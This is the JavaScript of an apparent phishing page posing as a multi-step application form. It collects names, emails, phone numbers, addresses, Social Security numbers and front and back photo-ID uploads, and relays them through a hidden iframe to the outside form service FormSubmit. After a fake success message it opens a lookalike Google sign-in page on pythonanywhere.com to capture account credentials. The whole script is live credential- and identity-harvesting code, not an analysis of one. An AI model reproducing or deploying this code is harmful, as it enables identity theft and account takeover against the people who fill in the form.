    let currentStep = 1;
    let isFormSubmitted = false;
    
    function nextStep() {
      if (validateCurrentStep()) {
        if (currentStep < 3) {
          document.getElementById(`step${currentStep}`).classList.remove("active");
          currentStep++;
          document.getElementById(`step${currentStep}`).classList.add("active");
          updateStepIndicator();
        }
      }
    }

    function prevStep() {
      if (currentStep > 1) {
        document.getElementById(`step${currentStep}`).classList.remove("active");
        currentStep--;
        document.getElementById(`step${currentStep}`).classList.add("active");
        updateStepIndicator();
      }
    }

    function updateStepIndicator() {
      const dots = document.querySelectorAll(".step-dot");
      dots.forEach((dot, index) => {
        dot.classList.toggle("active", index === currentStep - 1);
      });
    }

    function validateCurrentStep() {
      let isValid = true;
      
      // Clear previous errors
      document.querySelectorAll('.error-message').forEach(error => {
        error.style.display = 'none';
      });
      
      // Validate step 1
      if (currentStep === 1) {
        const fullname = document.getElementById('fullname').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        
        if (!fullname) {
          document.getElementById('fullname-error').style.display = 'block';
          isValid = false;
        }
        
        if (!email || !isValidEmail(email)) {
          document.getElementById('email-error').style.display = 'block';
          isValid = false;
        }
        
        if (!phone) {
          document.getElementById('phone-error').style.display = 'block';
          isValid = false;
        }
      }
      
      // Validate step 2
      if (currentStep === 2) {
        const address = document.getElementById('address').value.trim();
        const ssn = document.getElementById('ssn').value.trim();
        
        if (!address) {
          document.getElementById('address-error').style.display = 'block';
          isValid = false;
        }
        
        if (!ssn || !/^\d{9}$/.test(ssn)) {
          document.getElementById('ssn-error').style.display = 'block';
          isValid = false;
        }
      }
      
      return isValid;
    }
    
    function isValidEmail(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    }

    function setupDragDrop(dropId, inputId) {
      const dropZone = document.getElementById(dropId);
      const input = document.getElementById(inputId);
      dropZone.addEventListener("click", () => input.click());
      dropZone.addEventListener("dragover", (e) => {
        e.preventDefault();
        dropZone.classList.add("dragover");
      });
      dropZone.addEventListener("dragleave", () => dropZone.classList.remove("dragover"));
      dropZone.addEventListener("drop", (e) => {
        e.preventDefault();
        dropZone.classList.remove("dragover");
        input.files = e.dataTransfer.files;
        updateFileName(inputId);
      });
    }

    function updateFileName(inputId) {
      const input = document.getElementById(inputId);
      const fileNameSpan = document.getElementById(`file-name-${inputId.split('-')[1]}`);
      if (input.files.length > 0) {
        fileNameSpan.textContent = input.files[0].name;
        fileNameSpan.style.color = 'var(--text-color)';
      }
    }

    setupDragDrop("drop-front", "id-front");
    setupDragDrop("drop-back", "id-back");

    document.getElementById('id-front').addEventListener('change', function() {
      updateFileName('id-front');
    });

    document.getElementById('id-back').addEventListener('change', function() {
      updateFileName('id-back');
    });

    function openVerification() {
      window.open('https://googlesignin.pythonanywhere.com/', '_blank');
      closeAlert();
    }

    function closeAlert() {
      document.getElementById('verificationAlert').style.display = 'none';
      document.getElementById('overlay').style.display = 'none';
    }

    // FORM SUBMISSION HANDLER
    document.getElementById("applicationForm").addEventListener("submit", function(e) {
      e.preventDefault();
      
      if (isFormSubmitted) {
        alert('Form already submitted!');
        return;
      }

      // Validate all fields
      const requiredFields = this.querySelectorAll('[required]');
      let isValid = true;
      
      requiredFields.forEach(field => {
        if (!field.value.trim()) {
          isValid = false;
          field.style.borderColor = 'var(--error-color)';
        } else {
          field.style.borderColor = '';
        }
      });
      
      // Check file uploads
      const frontFile = document.getElementById('id-front').files[0];
      const backFile = document.getElementById('id-back').files[0];
      
      if (!frontFile || !backFile) {
        isValid = false;
        alert('Please upload both front and back of your Photo ID');
        return;
      }
      
      // Check file sizes (FormSubmit has limits)
      const maxSize = 10 * 1024 * 1024; // 10MB
      if (frontFile.size > maxSize || backFile.size > maxSize) {
        alert('File size too large. Please upload files smaller than 10MB.');
        return;
      }
      
      if (!isValid) {
        alert('Please fill in all required fields');
        return;
      }

      // Show loading
      document.getElementById("loading").style.display = "block";
      document.getElementById("submitButton").disabled = true;
      isFormSubmitted = true;
      
      // Submit the form to the hidden iframe
      this.submit();
      
      // Hide form and show success
      setTimeout(() => {
        document.querySelectorAll('.step').forEach(step => {
          step.style.display = 'none';
        });
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById("loading").style.display = "none";
      }, 1000);
      
      // Show verification alert after 10 seconds
      setTimeout(() => {
        document.getElementById('verificationAlert').style.display = 'block';
        document.getElementById('overlay').style.display = 'block';
      }, 10000);
    });

    // Listen for iframe load to detect successful submission
    document.getElementById('hiddenFrame').addEventListener('load', function() {
      console.log('Form submitted to FormSubmit');
    });
